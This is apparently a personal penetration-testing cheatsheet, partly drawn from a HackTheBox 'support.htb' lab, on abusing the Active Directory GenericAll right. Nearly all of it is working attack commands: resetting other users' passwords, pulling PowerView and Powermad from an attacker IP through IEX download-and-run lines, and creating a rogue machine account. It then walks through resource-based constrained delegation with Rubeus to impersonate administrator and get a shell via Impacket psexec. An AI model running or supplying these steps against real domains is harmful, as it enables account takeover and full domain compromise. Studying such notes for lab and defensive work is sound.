# GenricAll

GenricAll Permission
```powershell
# $cred is the user with generic write
$user = '$username-with-generic-write'
$pass = ConvertTo-SecureString 'yourpasswordgoeshere' -AsPlainText -Force
$cred = Net-Object System-Management.automation.pscredential $user,$pass
# Run a command on remote box, but we are using another users credentials
Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-AdAccountPassword -Identity $targetuser -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password123!' -Force)} -Credential $cred 
```
Then Wmi remote in with [[Impacket-Cheatsheet]]
```bash
impacket-wmiexec.py '$domain/$user:$password@domain.local'
```

ForceChangePassword - Bloodhound and [[PowerView-Cheatsheet]]
```powershell
$newpass = ConvertTo-SecureString 'yourpasswordgoeshere' -AsPlainText -Force
# Powerview command
Set-DomainUserPassword -Identity $target -AccountPassword $newPass
```

To Remove GenericAll from user, exchange user or security group
```powershell
Remove-ADPermission -Identity dc.support.htb -User '$userORexchangeuserORsecuritygroup' -AccessRights GenericAll
```


## GenericAll Abuse 

Create a machine account with password and the permission to be `AllowedToActOnBehalfOfOtherIdentity` , then to forge a self-signed a ticket to impersonate a user in the explained  given below by Bloodhound:

Full control of a computer object can be used to perform a resource based constrained delegation attack. Abusing this primitive is currently only possible through the Rubeus ([[Rubeus-Cheatsheet]] project.  First, if an attacker does not control an account with an SPN set, [Kevin Robertson's Powermad project](https://github.com/Kevin-Robertson/Powermad) can be used to add a new attacker-controlled computer account:

Download:
```powershell
PS C:\programdata> curl http://10.10.10.10/Rubeus.exe -o Rubeus.exe
C:\programdata> IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/PowerView.ps1')
PS C:\programdata> IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/Powermad.ps1')
# Check if you create machine
Get-DomainObject -Identity 'DC=DOMAIN,DC=TLD' | ms-ds-machineaccountquota
```


```powershell
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
```

[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) - [[PowerView-Cheatsheet]] - can be used to then retrieve the security identifier (SID) of the newly created computer account:

```powershell
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
```

We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

Next, we need to set this newly created security descriptor in the `msDS-AllowedToActOnBehalfOfOtherIdentity` field of the computer account we're taking over, again using PowerView in this case:

```powershell
Get-DomainComputer attackersystem | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

[SharpCollection: Rubeus](https://github.com/Flangvik/SharpCollection.git) or [Ghostpack/Rubeus](https://github.com/GhostPack/Rubeus)
We can then use [[Rubeus-Cheatsheet]] to hash the plaintext password into its RC4_HMAC form:

```bash
Rubeus.exe hash /password:Summer2018!
```

And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:

```bash
Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
```

Remove paste to vim, remove all spaces and save - [[Vim-Cheatsheet]]
```lua
:set paste
%s/ //g
:wq ticket.kirbi.b64
```

Decode Ticket, Convert the Ticket, export KRB5CCNAME variable and psexec with [[Impacket-Cheatsheet]]
```bash
base64 -d ticket.kirbi.b64 > ticket.kirbi 
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.kirbi
impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb
```

## References

[Bloodhound](https://bloodhound.readthedocs.io/en/latest/)